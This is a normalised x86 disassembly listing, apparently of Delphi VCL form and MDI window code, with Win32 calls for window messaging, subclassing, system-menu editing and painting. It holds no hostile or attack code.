mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa38
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa38
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa84
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa6c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa50
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa38
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa84
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa6c
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa6c
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa6c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa50
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa38
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa84
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa38
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa84
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa6c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46ad68
call sub_46aa50
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_467c44
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4651f8
mov edx esi
mov eax edi
call sub_46a5e8
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_467cf3 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4508ac
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4508ac
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_467e55
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_465208
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax ebx
call sub_4687b4
push eax
push 0x1
push 0x80
mov eax ebx
call sub_453a88
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_44cb90
push eax
mov eax ebx
call sub_44cbd4
push eax
mov eax ebx
call sub_453a88
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406b44
mov [ ebx + 0x254 ] eax
push ebx
push sub_466da0
call sub_4217e4
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_45db38
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_453a88
push eax
call SetWindowPos
jmp r-xdata
sub_467fa2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4680cd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_450c10
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_46a4c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4680d4
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_4680dc
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_450e7c
push 0x0
mov eax ebx
call sub_453a88
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_468120
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451600
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_453a88
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_453a88
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_468184
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46822c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468233
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
mov eax edi
call sub_464518
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_40338c
mov eax ebx
call sub_46853c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_40338c
test al al
jne r-xdata
sub_46823c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_450564
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_450564
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_468184
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_468284
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_468184
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4682a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_41860c
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_4184ec
mov eax edi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_41860c
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_4184ec
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_468518
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_453a88
mov dx 0xb000
call sub_4642d8
test al al
jne r-xdata
call sub_453a88
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_4642d8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46851f
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403a08
jmp r-xdata
call sub_403a08
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_450564
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_453a88
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_4642d8
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_44e340
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
call sub_403a08
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_453a88
mov dx 0xb01a
call sub_4642d8
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403a08
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44e340
sub_46853c
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_44e340
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_453a88
push eax
call SetFocus
mov eax ebx
call sub_453a88
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_46858c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_44e340
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_468640
mov eax esi
call sub_46853c
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_453eb0
mov edx eax
mov eax esi
call sub_468184
sub_4685f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_467208
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_44e340
mov eax ebx
call sub_467208
mov edx esi
call sub_4685f0
sub_468640
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_461664
mov edx esi
call sub_461648
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4686e8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_468734
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_4686e8
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_468764
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_4686e8
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_4687d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_424660
xor eax eax
push ebp
push sub_46887e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_424a8c
xor eax eax
push ebp
push sub_46885b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_40338c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468862
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_424a8c
retn
sub_46888c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_467208
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_46723c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_40338c
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_452d50
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_467288
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_40338c
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_46892c
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_453a88
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_453a88
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_4687b4
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_453a88
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_451c18
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_4689aa
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_424240
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_468a0c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_453a88
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_451edc
pop edi
pop esi
retn
sub_468a58
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453a88
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_468b54
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_46757c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_468a58
pop ecx
sub_468b88
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e85c
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_453a88
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_453a88
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_453a88
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_44d834
pop esi
pop ebx
retn
sub_468c18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_452cdc
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_453a88
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_461084
sub_468c78
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_451d78
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_460a98
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_468cc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_4612f8
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_468cfc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_468d97
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468d9e
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_4609f8
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46dab8
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_44a29c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46dab8
jmp r-xdata
sub_468dc4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_40338c
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
